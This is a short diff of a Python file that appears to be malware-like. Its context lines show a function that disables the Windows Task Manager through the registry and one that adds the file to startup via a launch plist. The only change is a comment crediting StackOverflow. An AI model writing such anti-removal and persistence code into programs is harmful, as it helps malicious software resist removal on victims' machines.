@@ -82,7 +82,7 @@ def disable_task_manager():
     except WindowsError as e:
         print("There was an error setting the registry key {}".format(e))
 
-#add file to startup
+#add file to startup (got this on stackoverflow)
 def add_to_startup(path):
     plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
     <plist version="1.0">
